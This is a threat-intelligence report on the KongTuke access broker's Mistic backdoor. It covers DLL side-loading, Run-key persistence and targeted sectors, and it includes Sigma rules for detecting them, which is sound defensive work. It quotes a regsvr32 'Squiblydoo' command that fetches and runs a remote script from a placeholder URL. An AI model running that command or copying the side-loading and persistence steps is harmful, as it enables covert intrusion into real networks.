report_name: Stealthy 'Mistic' Backdoor Linked to Ransomware IAB KongTuke in Pre-Attack Campaigns

threat_actors.name: KongTuke
threat_actors.description: A prolific initial access broker (IAB) that compromises corporate networks, establishes persistent access using custom tools like Mistic, and then sells that access to ransomware groups. The group has been active since at least April 2026.
threat_actors.goals: To gain and maintain persistent, stealthy access to corporate networks for the purpose of selling that access to ransomware operators.

threat_actors.name: Qilin
threat_actors.description: A major ransomware group that purchases network access from initial access brokers like KongTuke to deploy their ransomware.

threat_actors.name: Akira
threat_actors.description: A major ransomware group that purchases network access from initial access brokers like KongTuke to deploy their ransomware.

threat_actors.name: Black Basta
threat_actors.description: A major ransomware group that purchases network access from initial access brokers like KongTuke to deploy their ransomware.

attack_patterns.name: DLL Side-Loading
attack_patterns.description: The Mistic backdoor was loaded by a legitimate, signed executable (MpExtMs.exe) which loaded a malicious DLL (EndpointDlp.dll) placed in the same directory. This technique is used to bypass application allowlisting and reputation-based security controls.

attack_patterns.name: Match Legitimate Resource Name or Location
attack_patterns.description: The malicious DLL used for side-loading was named 'EndpointDlp.dll' to masquerade as a component of Microsoft's endpoint security suite.

attack_patterns.name: File Deletion
attack_patterns.description: The Mistic backdoor includes a kill switch that allows it to delete itself from the compromised system to hinder investigation.

attack_patterns.name: Web Protocols
attack_patterns.description: The Mistic backdoor communicates with its C2 server over standard web protocols to receive commands and exfiltrate data, blending in with normal network traffic.

attack_patterns.name: Registry Run Keys / Startup Folder
attack_patterns.description: KongTuke establishes persistence for the abused executable (MpExtMs.exe) by creating entries in the 'HKCU\Software\Microsoft\Windows\CurrentVersion\Run' registry key.

attack_patterns.name: Regsvr32
attack_patterns.description: KongTuke has been observed using the command 'regsvr32 /s /n /i:<url> scrobj.dll' to execute remote scripts, a technique associated with Squiblydoo.

malware.name: Mistic
malware.description: A sophisticated and stealthy Windows backdoor used by the KongTuke IAB. It is designed for long-term, low-visibility persistence, operating primarily in memory and using DLL side-loading for execution. It serves as a foothold for future ransomware deployment.

malware.name: ModeloRAT
malware.description: A remote access trojan deployed by KongTuke, observed in at least one incident alongside the Mistic backdoor.

malware.name: Qilin
malware.description: Ransomware deployed by affiliates who purchase access from initial access brokers like KongTuke.

malware.name: Akira
malware.description: Ransomware deployed by affiliates who purchase access from initial access brokers like KongTuke.

malware.name: Black Basta
malware.description: Ransomware deployed by affiliates who purchase access from initial access brokers like KongTuke.

tools.name: MpExtMs.exe
tools.description: A legitimate, signed Microsoft binary that was abused by KongTuke to perform DLL side-loading of the Mistic backdoor.

tools.name: Regsvr32
tools.description: The threat actor KongTuke uses regsvr32.exe to execute remote scripts as part of their attack chain, a technique known as Squiblydoo.

identities.name: Insurance Sector Organizations
identities.description: Organizations in the insurance sector were targeted by the KongTuke group using the Mistic backdoor.

identities.name: Education Sector Organizations
identities.description: Organizations in the education sector were targeted by the KongTuke group using the Mistic backdoor.

identities.name: IT Sector Organizations
identities.description: Organizations in the IT sector were targeted by the KongTuke group using the Mistic backdoor.

infrastructure.name: Mistic C2 Infrastructure
infrastructure.description: Command and control infrastructure used by the Mistic backdoor to receive commands and exfiltrate data.

indicators.name: Mistic Backdoor DLL Side-Loading
indicators.pattern:
title: Mistic Backdoor DLL Side-Loading Execution
id: 5e8a1b3c-7d4f-4e9a-8b2c-1d6f0a8b4c5d
status: experimental
description: Detects the execution of a legitimate Microsoft executable (MpExtMs.exe) from a non-standard directory, which is a known TTP for the KongTuke IAB to side-load the Mistic backdoor (EndpointDlp.dll).
references:
  - https://www.bleepingcomputer.com/news/security/stealthy-mistic-backdoor-linked-to-ransomware-access-broker-kongtuke/
author: cyber.netsecops.io
date: 2026-06-25
tags:
  - attack.t1574.002
  - attack.defense_evasion
level: high
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\MpExtMs.exe'
  filter:
    Image|startswith: 'C:\Windows\System32\'
  condition: selection and not filter
indicators.description: Detects the execution of MpExtMs.exe from a non-standard directory, a key indicator of the Mistic backdoor's DLL side-loading technique.

indicators.name: KongTuke Squiblydoo Execution
indicators.pattern:
title: KongTuke Associated Squiblydoo Command-Line
id: a2b3c4d5-e6f7-4a8b-9c0d-1e2f3a4b5c6d
status: experimental
description: Detects the use of regsvr32 to execute remote scripts, a technique associated with KongTuke.
references:
  - https://www.bleepingcomputer.com/news/security/stealthy-mistic-backdoor-linked-to-ransomware-access-broker-kongtuke/
author: cyber.netsecops.io
date: 2026-06-25
tags:
  - attack.t1218.010
  - attack.defense_evasion
level: high
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\regsvr32.exe'
    CommandLine|contains|all:
      - '/s'
      - '/n'
      - '/i:'
      - 'scrobj.dll'
  condition: selection
indicators.description: Detects the specific command-line pattern used by KongTuke to execute remote scripts via regsvr32, a technique known as Squiblydoo.

indicators.name: Mistic Backdoor Persistence via Run Key
indicators.x_netsecio_sigma_rule:
title: Mistic Backdoor Persistence via Run Key
id: f1e2d3c4-b5a6-4987-8654-321fedcba987
status: experimental
description: Detects the creation of a registry run key pointing to MpExtMs.exe, which is used by KongTuke for Mistic backdoor persistence.
references:
  - https://www.bleepingcomputer.com/news/security/stealthy-mistic-backdoor-linked-to-ransomware-access-broker-kongtuke/
author: cyber.netsecops.io
date: 2026-06-25
tags:
  - attack.t1547.001
  - attack.persistence
level: high
logsource:
  category: registry_event
  product: windows
detection:
  selection:
    EventType: 'SetValue'
    TargetObject|contains: '\Software\Microsoft\Windows\CurrentVersion\Run'
    Details|contains: 'MpExtMs.exe'
  condition: selection
indicators.description: Detects the creation of a persistence entry in the HKCU Run key pointing to the abused MpExtMs.exe executable.

indicators.name: Mistic Backdoor Associated File Names
indicators.x_netsecio_sigma_rule:
title: Mistic Backdoor Associated File Creation
id: 98765432-1fed-cba9-8765-43210fedcba9
status: experimental
description: Detects the presence of files associated with the Mistic backdoor side-loading routine.
references:
  - https://www.bleepingcomputer.com/news/security/stealthy-mistic-backdoor-linked-to-ransomware-access-broker-kongtuke/
author: cyber.netsecops.io
date: 2026-06-25
tags:
  - attack.t1574.002
level: medium
logsource:
  category: file_event
  product: windows
detection:
  selection:
    TargetFilename|endswith:
      - '\EndpointDlp.dll'
      - '\MpExtMs.exe'
  filter:
    TargetFilename|startswith: 'C:\Windows\System32\'
  condition: selection and not filter
indicators.description: Detects file names associated with the Mistic backdoor, specifically the malicious DLL and the abused executable, especially when found outside their legitimate directories.

relationships.target_name: Match Legitimate Resource Name or Location

relationships.source_name: Mistic Backdoor Persistence via Run Key
